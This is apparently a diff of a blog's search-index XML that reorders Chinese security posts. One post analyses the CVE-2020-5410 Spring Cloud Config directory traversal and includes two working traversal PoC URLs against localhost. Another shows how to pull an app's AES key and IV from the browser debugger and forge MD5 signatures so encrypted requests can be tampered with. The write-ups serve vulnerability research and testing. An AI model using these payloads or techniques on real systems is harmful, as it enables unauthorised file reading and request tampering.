@@ -143,53 +143,79 @@
 ]]></content>
   </entry>
   <entry>
-    <title>通过JS解开加密传输</title>
-    <url>/2020/04/03/JS-Decrypt/</url>
-    <content><![CDATA[<h1 id="JS解密过程"><a href="#JS解密过程" class="headerlink" title="JS解密过程"></a>JS解密过程</h1><blockquote>
-<p>为了不泄漏信息，文章中存在打码，修改参数等脱敏措施，但解密的方法未变，可供参考。</p>
-</blockquote>
-<p>很多app传输会对报文进行加密，并存在防篡改的签名机制，导致不能修改参数进行渗透测试，对于我不熟悉app逆向的人来说逆向app的成本比较高，这里介绍一种比较便捷的解密方式，就是通过js来解密请求。前提是需要这个app存在h5页面，并且h5页面的加密算法和app本身的加密算法一致。</p>
-<p>某app的h5页面显示的链接是 <a href="https://app.xxx.com/function/#/pages/queryDetails?id=644626" target="_blank" rel="noopener">https://app.xxx.com/function/#/pages/queryDetails?id=644626</a> 这种类型的，URl中参数在<code>#</code>之后，这种样式的URL基本都是前后端分离的系统，也就是会通过JS会处理很多事务。</p>
+    <title>CVE-2020-5410 Spring Cloud Config目录遍历漏洞（新）</title>
+    <url>/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/</url>
+    <content><![CDATA[<p>Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本以及较旧的不受支持的版本允许应用程序通过spring-cloud-config-server模块提供任意配置文件。</p>
 <a id="more"></a>
 
-<p>实际上在burp中抓包它的请求链接是 <a href="https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx" target="_blank" rel="noopener">https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx</a> 这样的。</p>
-<p><img src="/2020/04/03/JS-Decrypt/encrypt-request-data.jpg" alt="encrypt-request-data"></p>
-<p>测试过程中我的第一反应是尝试从js中将加解密方法找出来（虽然这个链接是app的，但是网页能访问，那它就一定是js加解密的，js加解密我个人认为比逆向app简单很多，而且也方便调试）。</p>
-<p>但有一点需要注意，前后端分离的系统，会对js压缩和混淆，一方面是减轻js的体量，另一方面能在一定程度上防止他人通过js分析出关键代码。所以在被压缩混淆的js中调试也还是有一定难度的。</p>
-<p>所幸网站的js很少，且大部分应用加密传输使用AES对报文进行加密，再使用RSA传输AES的密钥。</p>
-<p>随便找找就发现AES加密的js代码，在代码中发现加密方式是<code>CBC Pkcs7</code></p>
-<p>密钥o：<code>^BJSHGZ!@#ZZZDGJ</code>（密钥并不是这个，真实的密钥需要看变量n，数组arguments如果大于1，则使用arguments中的密钥，这个arguments具体是怎么来的我没搞懂，不过不重要，调试的时候我们能直接得到密钥的值，可以不用具体分析）</p>
-<p>偏移量iv：<code>0108489312380708</code></p>
-<p>AES加解密的过程如下图，还是比较清晰的。</p>
-<p><img src="/2020/04/03/JS-Decrypt/js-encrypt-code.png" alt="js-encrypt-code"></p>
-<p>下图是调试过程，密钥就直接拿到了：</p>
-<p><img src="/2020/04/03/JS-Decrypt/get-aes-key.png" alt="get-aes-key"></p>
-<p>⚠️ 这里有个js混淆的坑，对于不咋熟悉js的我，1824行 <code>u.default.encrypt</code>我还以为是另一种加密，在这里找这个是什么加密方法找了好久，结果它就是调用上图AES加密的方法，想太多了……</p>
-<p><img src="/2020/04/03/JS-Decrypt/aes-default-encrypt.jpg" alt="aes-default-encrypt"></p>
-<p>知道加解密方法，之后就可以尝试对参数进行修改了，同样是在调试过程，把参数取出，或者通过AES解密请求中的request body得到的请求参数，进行修改。</p>
-<p><img src="/2020/04/03/JS-Decrypt/unencrypt-request-body.png" alt="unencrypt-request-body"></p>
-<p>修改完成之后进行AES加密，我使用的是 <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a> ，加密过程调成如下图：</p>
-<p><img src="/2020/04/03/JS-Decrypt/cyberchef-aes-encrypt.png" alt="cyberchef-aes-encrypt"></p>
-<p>request body的加密就到这了。response body解密使用的密钥，iv，模式，填充都一样，是逆过程就不多写了。</p>
-<p>最后一个重点就是修改签名，修改完request body之后的签名肯定就变化了，就需要跟随请求来修改签名。</p>
-<p>签名大概的算法如下图，不咋懂js的我刚看到这时是一脸的懵逼。</p>
-<p><img src="/2020/04/03/JS-Decrypt/js-add-sign.png" alt="js-add-sign"></p>
-<p>不过好在可以调试，通过调试可以看到算出Q所需要的参数，不过不用那么麻烦，直接看Q前一步就行了，<code>Q = (0, g.default) (D).toString()</code>，也就是查看D是什么</p>
-<p>通过调试可以知道，D是：（去除了\）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9924531585918379141792&#x2F;queryServices&#x2F;011023reqno&#x3D;M4NofxiOtz4SvYpx&#123;&quot;head&quot;:&#123;&quot;client&quot;:&quot;ABC&quot;,&quot;transactionno&quot;:&quot;72789911122233&quot;,&quot;transactiontype&quot;:&quot;lis&quot;,&quot;transactionexedate&quot;:&quot;2020-04-03&quot;,&quot;transactionexetime&quot;:&quot;01:26:29&quot;&#125;,&quot;body&quot;:&quot;120001111&quot;&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p><a href="https://github.com/spring-cloud/spring-cloud-config/compare/v2.2.2.RELEASE...v2.2.3.RELEASE" target="_blank" rel="noopener">对比2.2.2和2.2.3版本</a>，发现其中有两个commits似乎和漏洞修复有关。</p>
+<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/commits.png" alt="commits"></p>
+<p><a href="https://github.com/spring-cloud/spring-cloud-config/commit/1c01d11b74ca08d04e89d935f4cafe1bd0e57c3c" target="_blank" rel="noopener">查看对比</a>发现在<code>spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/environment/EnvironmentController.java</code>中多了一个<code>pathUtils.isInvalidEncodedLocation</code>判断。</p>
+<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/diff-2.2.2.png" alt="diff-2.2.2"></p>
+<p>为了搞明白为什么要多加一个<code>pathUtils.isInvalidEncodedLocation</code>判断，查看<code>Environment.normalize()</code>，发现是将<code>SLACH_PLACEHOLDER</code>替换成<code>/</code>，<code>SLACH_PLACEHOLDER</code>为<code>(_)</code>。看到这里，是不是就想起了在CVE-2020-5405中利用<code>(_)</code>代替<code>/</code>绕过检测的方法。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">normalize</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s != <span class="keyword">null</span> &amp;&amp; s.contains(SLASH_PLACEHOLDER)) &#123;</span><br><span class="line">		<span class="comment">// "(_)" is uncommon in a git repo name, but "/" cannot be matched</span></span><br><span class="line">		<span class="comment">// by Spring MVC</span></span><br><span class="line">		<span class="keyword">return</span> s.replace(SLASH_PLACEHOLDER, <span class="string">"/"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>D是由M+T+B+S+x组成的，我们修改的只是请求参数，请求参数在x中，也就是说我们修改其他参数我们都不用改。直接在调试过程中得到的D中修改请求参数，再对D进行hash就得到了sign。</p>
-<p>⚠️ 确定签名算法中有一步就是因为hash方法弄错了导致浪费了很多时间，我在js代码中某处看到了sha1，我就以为hash方法是sha1，结果hash方法是md5…… Orz 怪不得我之前的加签都和结果对不上，还以为漏了算法中的某一步。</p>
-<p><img src="/2020/04/03/JS-Decrypt/debug-sign.png" alt="debug-sign"></p>
-<h1 id="实操环节"><a href="#实操环节" class="headerlink" title="实操环节"></a>实操环节</h1><p>访问网页，打开F12开发者工具，选择Debugger，点击index.js，在1522行和1835行下断点，</p>
-<p>然后复制n和iv的值</p>
-<p><img src="/2020/04/03/JS-Decrypt/debug-aes-key.png" alt="debug-aes-key"></p>
-<p>其他配置可参考下图，mode是CBC，padding是pkcs7（如果你的AES加解密没有pkcs7，选pkcs5也是一样的）</p>
-<p><img src="/2020/04/03/JS-Decrypt/cyberchef-set-aes-encrypt.png" alt="cyberchef-set-aes-encrypt"></p>
-<p>点击继续，跳到下一个断点，这里可以复制E的值，E就是request body的值（记得得去掉<code>\</code>）直接得到请求内容，然后修改它。再复制D（去掉<code>\</code>），同样在请求参数中修改它。</p>
-<p><img src="/2020/04/03/JS-Decrypt/debug-sign-2.jpg" alt="debug-sign-2"></p>
-<p>修改完成之后，将E的值进行AES加密作为新的request body，D的值进行md5，就能得到signature的值。此时就能对报文参数修改测试了。</p>
-<p><img src="/2020/04/03/JS-Decrypt/burp-request.png" alt="burp-request"></p>
+
+
+<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><blockquote>
+<p>调试所使用版本为<code>spring-cloud-config-2.2.2.RELEASE</code></p>
+<p>和CVE-2020-5405一样需要，更将configserver.yml改成本地配置</p>
+</blockquote>
+<p>和前面两个漏洞（CVE-2019-3799和CVE-2020-5405）类似，也是拼接了传入的值，而传入的值能够通过URL二次编码和<code>(_)</code>替换绕过路径检测，实现任意文件读取。但触发任意文件读取的函数和入口不一样。</p>
+<p>在<code>EnvironmentController.java</code>中找到<code>getEnvironment</code>方法，其中可控的参数为<code>name</code>、<code>profiles</code>和<code>label</code>，调试步进<code>findOne</code>方法</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getEnvironment.png" alt="debug-getEnvironment" style="zoom:45%;">
+
+
+
+<p><code>NativeEnvironmentRepository.java</code>中的<code>getArgs</code>中存在对我们可控参数<code>name</code>、<code>profiles</code>和<code>label</code>的处理，步进该方法进行查看。</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-findOne.png" alt="debug-findOne" style="zoom:45%;">
+
+
+
+<p>在<code>getArgs()</code>方法中看到熟悉的<code>getLocations()</code>，这里可能存在路径拼接</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getArgs.png" alt="debug-getArgs" style="zoom:45%;">
+
+
+
+<p>果然，在<code>getLocations()</code>方法中进行了路径的拼接，将<code>location</code>和<code>label</code>参数拼接在一起</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getLocations.png" alt="debug-getLocations" style="zoom:45%;">
+
+
+
+<p>光有<code>location</code>的拼接并不能产生文件读取，还得找到读取文件名的控制。</p>
+<p>经过一段时间的调试，最终发现在<code>builder.run</code>中发现整个路径的拼接。</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-builder-run.png" alt="debug-builder-run" style="zoom:45%;">
+
+
+
+<p>整个过程调用栈比较长，调试起来比较麻烦，知道这里将<code>search-locations</code>+<code>label</code>+<code>name</code>拼接起来就行（上面代码中447行中的<code>location</code>是<code>search-locations</code>+<code>label</code>的结果）。</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-stack.png" alt="debug-stack" style="zoom:45%;">
+
+
+
+<p><code>load</code>方法如下</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-load.png" alt="debug-load" style="zoom:45%;">
+
+<p><code>load</code>方法调用<code>loadForFileExtension</code>方法，在其中发现整个文件路径的拼接</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-loadForFileExtension.png" alt="debug-loadForFileExtension" style="zoom:45%;">
+
+
+
+<p>注意拼接后还带上了 <code>&quot;-&quot; + profile + fileExtension</code>，虽然<code>profile</code>和<code>fileExtension</code>都是可控的，但是这个<code>-</code>比较难处理。<code>-</code>的存在会导致绝大部分文件都无法被读取。</p>
+<p>注意到修复中将<code>#</code>做了限制，根据<code>#</code>在URL中的特性猜测<code>#</code>会使后面的字符变成标识符，不会被识别。</p>
+<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/location-contain-sharp.png" alt="location-contain-sharp" style="zoom:45%;">
+
+
+
+<p>构造PoC进行请求后发现果然能用<code>#</code>“注释”后面的内容。</p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>PoC：<a href="http://127.0.0.1:8888/test.txt%23/seikei/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29" target="_blank" rel="noopener">http://127.0.0.1:8888/test.txt%23/seikei/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29</a> </p>
+<p><code>test.txt</code>文件中的内容为<code>just for test</code>，可以看到其中存在多处文件信息回显。因为<code>file:/tmp//test.txt#-seikei.xml</code>中<code>#</code>后面的字符不会被解析，等于访问的是<code>file:/tmp//test.txt</code>。</p>
+<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/poc1.png" alt="poc1"></p>
+<p>由于整个文件路径是由<code>label</code>和<code>name</code>进行的拼接，所以也可以在<code>name</code>处输入路径回溯符。</p>
+<p>测试之后发现同样会返回文件内容。</p>
+<p>PoC2：<a href="http://127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt%23/seikei/test" target="_blank" rel="noopener">http://127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt%23/seikei/test</a> </p>
+<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/poc2.png" alt="poc2"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7877" target="_blank" rel="noopener">https://xz.aliyun.com/t/7877</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -463,131 +489,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>CVE-2020-5410 Spring Cloud Config目录遍历漏洞（新）</title>
-    <url>/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/</url>
-    <content><![CDATA[<p>Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本以及较旧的不受支持的版本允许应用程序通过spring-cloud-config-server模块提供任意配置文件。</p>
-<a id="more"></a>
-
-<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p><a href="https://github.com/spring-cloud/spring-cloud-config/compare/v2.2.2.RELEASE...v2.2.3.RELEASE" target="_blank" rel="noopener">对比2.2.2和2.2.3版本</a>，发现其中有两个commits似乎和漏洞修复有关。</p>
-<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/commits.png" alt="commits"></p>
-<p><a href="https://github.com/spring-cloud/spring-cloud-config/commit/1c01d11b74ca08d04e89d935f4cafe1bd0e57c3c" target="_blank" rel="noopener">查看对比</a>发现在<code>spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/environment/EnvironmentController.java</code>中多了一个<code>pathUtils.isInvalidEncodedLocation</code>判断。</p>
-<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/diff-2.2.2.png" alt="diff-2.2.2"></p>
-<p>为了搞明白为什么要多加一个<code>pathUtils.isInvalidEncodedLocation</code>判断，查看<code>Environment.normalize()</code>，发现是将<code>SLACH_PLACEHOLDER</code>替换成<code>/</code>，<code>SLACH_PLACEHOLDER</code>为<code>(_)</code>。看到这里，是不是就想起了在CVE-2020-5405中利用<code>(_)</code>代替<code>/</code>绕过检测的方法。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">normalize</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s != <span class="keyword">null</span> &amp;&amp; s.contains(SLASH_PLACEHOLDER)) &#123;</span><br><span class="line">		<span class="comment">// "(_)" is uncommon in a git repo name, but "/" cannot be matched</span></span><br><span class="line">		<span class="comment">// by Spring MVC</span></span><br><span class="line">		<span class="keyword">return</span> s.replace(SLASH_PLACEHOLDER, <span class="string">"/"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><blockquote>
-<p>调试所使用版本为<code>spring-cloud-config-2.2.2.RELEASE</code></p>
-<p>和CVE-2020-5405一样需要，更将configserver.yml改成本地配置</p>
-</blockquote>
-<p>和前面两个漏洞（CVE-2019-3799和CVE-2020-5405）类似，也是拼接了传入的值，而传入的值能够通过URL二次编码和<code>(_)</code>替换绕过路径检测，实现任意文件读取。但触发任意文件读取的函数和入口不一样。</p>
-<p>在<code>EnvironmentController.java</code>中找到<code>getEnvironment</code>方法，其中可控的参数为<code>name</code>、<code>profiles</code>和<code>label</code>，调试步进<code>findOne</code>方法</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getEnvironment.png" alt="debug-getEnvironment" style="zoom:45%;">
-
-
-
-<p><code>NativeEnvironmentRepository.java</code>中的<code>getArgs</code>中存在对我们可控参数<code>name</code>、<code>profiles</code>和<code>label</code>的处理，步进该方法进行查看。</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-findOne.png" alt="debug-findOne" style="zoom:45%;">
-
-
-
-<p>在<code>getArgs()</code>方法中看到熟悉的<code>getLocations()</code>，这里可能存在路径拼接</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getArgs.png" alt="debug-getArgs" style="zoom:45%;">
-
-
-
-<p>果然，在<code>getLocations()</code>方法中进行了路径的拼接，将<code>location</code>和<code>label</code>参数拼接在一起</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-getLocations.png" alt="debug-getLocations" style="zoom:45%;">
-
-
-
-<p>光有<code>location</code>的拼接并不能产生文件读取，还得找到读取文件名的控制。</p>
-<p>经过一段时间的调试，最终发现在<code>builder.run</code>中发现整个路径的拼接。</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-builder-run.png" alt="debug-builder-run" style="zoom:45%;">
-
-
-
-<p>整个过程调用栈比较长，调试起来比较麻烦，知道这里将<code>search-locations</code>+<code>label</code>+<code>name</code>拼接起来就行（上面代码中447行中的<code>location</code>是<code>search-locations</code>+<code>label</code>的结果）。</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-stack.png" alt="debug-stack" style="zoom:45%;">
-
-
-
-<p><code>load</code>方法如下</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-load.png" alt="debug-load" style="zoom:45%;">
-
-<p><code>load</code>方法调用<code>loadForFileExtension</code>方法，在其中发现整个文件路径的拼接</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/debug-loadForFileExtension.png" alt="debug-loadForFileExtension" style="zoom:45%;">
-
-
-
-<p>注意拼接后还带上了 <code>&quot;-&quot; + profile + fileExtension</code>，虽然<code>profile</code>和<code>fileExtension</code>都是可控的，但是这个<code>-</code>比较难处理。<code>-</code>的存在会导致绝大部分文件都无法被读取。</p>
-<p>注意到修复中将<code>#</code>做了限制，根据<code>#</code>在URL中的特性猜测<code>#</code>会使后面的字符变成标识符，不会被识别。</p>
-<img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/location-contain-sharp.png" alt="location-contain-sharp" style="zoom:45%;">
-
-
-
-<p>构造PoC进行请求后发现果然能用<code>#</code>“注释”后面的内容。</p>
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>PoC：<a href="http://127.0.0.1:8888/test.txt%23/seikei/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29" target="_blank" rel="noopener">http://127.0.0.1:8888/test.txt%23/seikei/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29</a> </p>
-<p><code>test.txt</code>文件中的内容为<code>just for test</code>，可以看到其中存在多处文件信息回显。因为<code>file:/tmp//test.txt#-seikei.xml</code>中<code>#</code>后面的字符不会被解析，等于访问的是<code>file:/tmp//test.txt</code>。</p>
-<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/poc1.png" alt="poc1"></p>
-<p>由于整个文件路径是由<code>label</code>和<code>name</code>进行的拼接，所以也可以在<code>name</code>处输入路径回溯符。</p>
-<p>测试之后发现同样会返回文件内容。</p>
-<p>PoC2：<a href="http://127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt%23/seikei/test" target="_blank" rel="noopener">http://127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt%23/seikei/test</a> </p>
-<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/poc2.png" alt="poc2"></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7877" target="_blank" rel="noopener">https://xz.aliyun.com/t/7877</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Java SpringBoot框架代码审计二 - Spring Boot项目结构介绍</title>
-    <url>/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/</url>
-    <content><![CDATA[<h1 id="Spring-Boot项目结构"><a href="#Spring-Boot项目结构" class="headerlink" title="Spring Boot项目结构"></a>Spring Boot项目结构</h1><p>一个简单Spring Boot项目的目录结构如下图</p>
-<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/springboot-directory.png" alt="springboot-directory" style="zoom:33%;">
-
-<a id="more"></a>
-
-<p>Java代码都在<code>src/main/java/</code>目录下，<code>src/main/resources/</code>中放置资源文件。</p>
-<h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><p><code>common/</code>: 存放通用类，如工具类和通用返回结果</p>
-<p><code>config/</code>: 存放配置文件</p>
-<p><code>controller/</code>: 存放控制器，接收从前端传来的参数，对访问控制进行转发、各类基本参数校验或者不复用的业务简单处理等。</p>
-<p><code>dao/</code>: 数据访问层，与数据库进行交互，负责数据库操作，在Mybaits框架中存放自定义的Mapper接口</p>
-<p><code>entity/</code>: 存放实体类</p>
-<p><code>interceptor/</code>: 拦截器</p>
-<p><code>service/</code>: 存放服务类，负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。</p>
-<p><code>utils/</code>: 存放工具类</p>
-<p><code>NewBeeMallApplication.java</code>: Spring Boot启动类</p>
-<p>非该项目，但可能存在的文件夹：</p>
-<p><code>dto/</code>:  存放数据传输对象（Data Transfer Object），如请求参数和返回结果</p>
-<p><code>vo/</code>:  视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄漏，保证数据安全</p>
-<p><code>constant/</code>:  存放常量</p>
-<p><code>filter/</code>: 存放过滤器</p>
-<p><code>component/</code>: 存放组件</p>
-<h2 id="资源目录结构"><a href="#资源目录结构" class="headerlink" title="资源目录结构"></a>资源目录结构</h2><p>在<code>src/main/resources</code>下存放资源文件</p>
-<p><code>mapper/</code>: 存放Mybaits的mapper.xml文件</p>
-<p><code>static/</code>: 静态资源文件目录（Javascript、CSS、图片等），在这个目录中的所有文件可以被直接访问</p>
-<p><code>templates/</code>: 存放模版文件</p>
-<p><code>application.properties</code>: Spring Boot默认配置文件</p>
-<p>非该项目，但可能存在的文件：</p>
-<p><code>META-INF/</code>: 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务</p>
-<p><code>i18n/</code>: 国际化文件的简称，来源是英文单词internationalization的首末字符i和n，18为中间的字符数</p>
-<h2 id="其他结构"><a href="#其他结构" class="headerlink" title="其他结构"></a>其他结构</h2><p>⚠️ Spring Boot无需配置 <code>web.xml</code>，但在其他Java项目中，<code>web.xml</code>是一个非常重要的文件，用来配置Servlet、Filter、Listener等。</p>
-<p><code>pom.xml</code>: maven的配置文件，记录项目信息、依赖信息、构建配置等</p>
-<p>如果使用gradle进行自动化构建，则会存在<code>build.gradle</code>文件</p>
-<h1 id="请求传递流程"><a href="#请求传递流程" class="headerlink" title="请求传递流程"></a>请求传递流程</h1><p>Java审计难上手的一大因素是Java一般都是大中型系统，架构相比于PHP开发的小系统会复杂很多，大型系统开发过程中难免出现不规范的编码习惯，再加上函数调用错综复杂，审计代码时光弄明白程序逻辑，理解程序员的编码习惯就要花费大量精力了。</p>
-<p>首先弄明白请求流程的处理，知道用户请求内容会经过哪些代码才能理解程序处理逻辑，可以对我们后续的审计提供非常大的帮助。</p>
-<p>用户的请求发送给服务器之后，中间件（案例项目使用的是Tomcat）会将请求解析发送给Spring的<code>DispatcherServlet</code>，<code>DispatcherServlet</code>的作用是分配请求，详细的过程我们暂时不深入。只需要知道中间件解析请求之后请求会经过Filter和Interceptor。Filter（过滤器）和Interceptor（拦截器）做的事很相似，但他们的触发时机不同，且Interceptor只在Spring中生效，它们可以用来对请求进行过滤字符、拦截、鉴权、日志记录等功能，简单说就是可以在参数进入应用前对其处理，做到全局的处理。</p>
-<p>请求经过Filter和Interceptor之后会被<code>DispatcherServlet</code>分配到对应路径的Controller（控制器），文件名为<code>ExampleController</code>，Controller负责简单的逻辑处理和参数校验功能，之后调用Service。</p>
-<p>Service主要负责业务模块逻辑处理。Service层中有两种类，一是接口类，文件名为<code>ExampleService</code>，用来声明接口；二是接口实现类，文件名为<code>ExampleServiceImpl</code>，作为实现类实现接口中的方法。实现的代码都在<code>ExampleServiceImpl</code>中。当Service涉及到数据库操作时就会调用Dao。</p>
-<p>Dao主要负责数据库的操作，由于使用Mybatis作为ORM框架，只做中间传递的作用，所有SQL语句都是写在配置文件中的，配置文件名为<code>ExampleMapper.xml</code>，存放在<code>src/main/resources/mapper</code>中。</p>
-<p>从用户请求到服务器处理的主要过程如下图所示（省略了<code>DispatcherServlet</code>）：</p>
-<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-path.png" alt="request-path" style="zoom:50%;">
-
-
-
-<p>为了更好理解，以「保存订单」功能为例，主要的请求流程如下图，不了解Spring请求传递的同学可以在代码中跟一遍请求流程，会加深请求传递的印象。</p>
-<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-example.png" alt="request-example" style="zoom:50%;">]]></content>
-  </entry>
-  <entry>
     <title>Java SpringBoot框架代码审计一 - 前期准备</title>
     <url>/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/</url>
     <content><![CDATA[<p>本系列文章使用SpringBoot+Mybaits的小型商城作为本次代码审计的目标，项目地址：<a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">https://github.com/newbee-ltd/newbee-mall</a> </p>
@@ -638,6 +539,105 @@
 <h1 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h1><p>以上步骤完成后，在IntelliJ IDEA中运行项目，访问在<code>application.properties</code>中配置的端口就能看到项目。</p>
 <p><img src="/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/run-application.png" alt="run-application"></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>通过JS解开加密传输</title>
+    <url>/2020/04/03/JS-Decrypt/</url>
+    <content><![CDATA[<h1 id="JS解密过程"><a href="#JS解密过程" class="headerlink" title="JS解密过程"></a>JS解密过程</h1><blockquote>
+<p>为了不泄漏信息，文章中存在打码，修改参数等脱敏措施，但解密的方法未变，可供参考。</p>
+</blockquote>
+<p>很多app传输会对报文进行加密，并存在防篡改的签名机制，导致不能修改参数进行渗透测试，对于我不熟悉app逆向的人来说逆向app的成本比较高，这里介绍一种比较便捷的解密方式，就是通过js来解密请求。前提是需要这个app存在h5页面，并且h5页面的加密算法和app本身的加密算法一致。</p>
+<p>某app的h5页面显示的链接是 <a href="https://app.xxx.com/function/#/pages/queryDetails?id=644626" target="_blank" rel="noopener">https://app.xxx.com/function/#/pages/queryDetails?id=644626</a> 这种类型的，URl中参数在<code>#</code>之后，这种样式的URL基本都是前后端分离的系统，也就是会通过JS会处理很多事务。</p>
+<a id="more"></a>
+
+<p>实际上在burp中抓包它的请求链接是 <a href="https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx" target="_blank" rel="noopener">https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx</a> 这样的。</p>
+<p><img src="/2020/04/03/JS-Decrypt/encrypt-request-data.jpg" alt="encrypt-request-data"></p>
+<p>测试过程中我的第一反应是尝试从js中将加解密方法找出来（虽然这个链接是app的，但是网页能访问，那它就一定是js加解密的，js加解密我个人认为比逆向app简单很多，而且也方便调试）。</p>
